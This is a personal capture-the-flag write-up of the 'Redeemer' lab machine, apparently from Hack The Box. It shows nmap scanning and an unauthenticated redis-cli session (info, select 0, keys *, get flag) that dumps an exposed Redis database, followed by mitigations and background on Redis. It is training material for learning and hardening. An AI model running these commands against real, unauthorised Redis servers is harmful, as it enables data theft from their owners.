---
Box: Redeemer
Ip: 10.129.176.29
Date: 2025-10-23
Difficulty: Easy
Author: Somnath
Os: Linux
Summary: Enumerating a Redis server remotely and then dumping its database in order to retrieve the flag.
---

# Redeemer — Easy

**Author:** Somnath  
**IP:** 10.129.176.29  
**OS:** Linux  
**Date:** 2025-10-23  

## Summary
Enumerating a Redis server remotely and then dumping its database in order to retrieve the flag.

---

## Enumeration
**Nmap command:**  
\`\`\`bash
nmap -sC -sV -oN nmap_initial.txt 10.129.176.29
\`\`\`

**Key ports / services:**  
- 6379 - Redis runs on 6379 port

**Web discovery (gobuster/ferox):**  
- `/admin` — note

---

## Initial Access
**Vector / vuln:**  
- Explanation of the vulnerability. - Enumerating a Redis server remotely and then dumping its database in order to retrieve the flag. Testing database vulneribilty.

**Commands used / exploit:**  
\`\`\`bash
	1. ping -c 4 10.129.176.29
	2. nmap -p- -sV 10.129.176.29
	3. sudo apt install redis-tools
	4. redis-cli -h 10.129.176.29
	5. info
	6. select 0
	7. keys *
	8. get flag
  
# example commands/payloads used
\`\`\`
	No external payloads were used

**Screenshot:** `Attachments/Redeemer/initial_shell.png`
	
  1. ![[Pasted image 20251022231027.png]]
	- - `-p-`  - Scan **all TCP ports** from 1 through 65535. (Shortcut for `-p1-65535`.)
	- `-sV`  - **Version detection**. Nmap will try to connect to open ports and probe services to determine the service name and version (e.g., `ssh OpenSSH 8.2p1`)
	
   2. ![[Pasted image 20251022231541.png]]
   3. ![[Pasted image 20251022231943.png]]
	- -h - here h refers to the hostname. There are multipe comads for redis-cli which can be seen by typng command -help
	
   4. ![[Pasted image 20251022232303.png]]

---

## Mitigation
- **Block public access to Redis (TCP 6379)** immediately to prevent unauthorized connections.
- **Enable `protected-mode` and bind Redis to localhost or trusted management IPs** only.
- **Require authentication / enforce strong passwords** for all Redis users; use Redis ACLs for fine-grained access control.
- **Rename or disable dangerous commands** such as `CONFIG`, `FLUSHALL`, `DEBUG`, `KEYS` to prevent misuse.
- **Restrict filesystem permissions** on RDB/AOF persistence files to the Redis service user only.
- **Enable encryption in transit** (TLS) or require access through VPN/SSH tunnels to protect data.
- **Review and harden Redis ACLs** to ensure least-privilege access (users only have commands and keys they need).
- **Regularly audit Redis logs and metrics** to detect unauthorized access attempts or suspicious activity.
- **Apply principle of least privilege** to the Redis service account and underlying OS permissions.
- **Update and patch Redis server software** to the latest stable version to mitigate known vulnerabilities.

## Takeaways / Notes
- **Databases** are a collection of organized information that can be easily accessed, managed and updated. In most environments, database systems are very important because they communicate information related to your sales transactions, product inventory, customer profiles and marketing activities. 
- There are different types of databases and one among them is Redis, which is an **'in-memory' database**. Inmemory databases are the ones that rely essentially on the primary memory for data storage (meaning that the database is managed in the RAM of the system); in contrast to databases that store data on the disk or SSDs. As the primary memory is significantly faster than the secondary memory, the data retrieval time in the case of 'in-memory' databases is very small, thus offering very efficient & minimal response times. 
- **In-memory databases** like Redis are typically used to cache data that is frequently requested for quick retrieval. For example, if there is a website that returns some prices on the front page of the site. The website may be written to first check if the needed prices are in Redis, and if not, then check the traditional database (like MySQL or MongoDB). When the value is loaded from the database, it is then stored in Redis for some shorter period of time (seconds or minutes or hours), to handle any similar requests that arrive during that timeframe. For a site with lots of traffic, this configuration allows for much faster retrieval for the majority of requests, while still having stable long term storage in the main database.
- **Redis (REmote DIctionary Server)** is an open-source advanced NoSQL key-value data store used as a database, cache, and message broker. The data is stored in a dictionary format having key-value pairs. It is typically used for short term storage of data that needs fast retrieval. Redis does backup data to hard drives to provide consistency.
- **The server** -  Redis runs as server-side software so its core functionality is in its server component. The server listens for connections from clients, programmatically or through the command-line interface.
- **The CLI -** The command-line interface (CLI) is a powerful tool that gives you complete access to Redis’s data and its functionalities if you are developing a software or tool that needs to interact with it.
- **Database -** The database is stored in the server's RAM to enable fast data access. Redis also writes the contents of the database to disk at varying intervals to persist it as a backup, in case of failure.

## Artifacts
- Attachments folder: `HackTheBox/Easy/Redeemer/`

